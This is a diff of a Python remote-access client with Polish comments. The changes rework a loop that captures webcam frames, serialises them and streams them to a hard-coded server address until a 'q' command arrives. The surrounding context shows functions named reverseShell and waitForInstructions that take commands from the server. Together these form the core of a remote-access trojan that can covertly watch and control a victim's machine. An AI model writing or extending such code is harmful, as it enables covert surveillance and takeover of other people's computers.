@@ -14,13 +14,12 @@ JOB_NUMBER = [1,2]
 queue = Queue()
 
 """
-Funkcja camera musi nasłuchiwać komendy zakończena od strony serwera.
-Jeśli komenda nie występuje to wysyła obraz z kamery do serwera.
+wyłączenie kamery powoduje nieznany błąd w komunikacji programów
 """
 
 
 #HOST = '157.245.34.67'
-HOST = '192.168.1.227'
+HOST = '192.168.1.228'
 PORT = 5000
 
 def camera(client_socket):
@@ -30,19 +29,24 @@ def camera(client_socket):
     cam.set(4, 480)
     img_counter = 0
     client_socket.setblocking(0)
-    while True: 
-        command = client_socket.recv(1024)
-        if not command:
-            ret, frame = cam.read()
-            result, frame = cv2.imencode('.jpg', frame, encode_param)
-            data = pickle.dumps(frame, 0)
-            size = len(data)
-            client_socket.sendall(struct.pack(">L", size) + data)
-            img_counter += 1
+    while True:
+        ret, frame = cam.read()
+        result, frame = cv2.imencode('.jpg', frame, encode_param)
+        data = pickle.dumps(frame, 0)
+        size = len(data)
+        client_socket.sendall(struct.pack(">L", size) + data)
+        img_counter += 1
+        try:
+            command = client_socket.recv(1024)
+        except:
+            continue
         else:
-            if command[:1].decode("utf-8") == 'q':
+            if command.decode("utf-8") == 'q':
                 break
     cam.release()
+    print("Camera stopped & closed")
+    
+ 
 
 def reverseShell(client_socket):
     while True:
@@ -60,7 +64,7 @@ def reverseShell(client_socket):
 def waitForInstructions(client_socket):
     while True:
         client_socket.setblocking(1)
-        print("Waiting for instructions")
+        print("Waiting for instructions...")
         data = client_socket.recv(1024)
         if len(data) > 0:
             command = data.decode("utf-8")
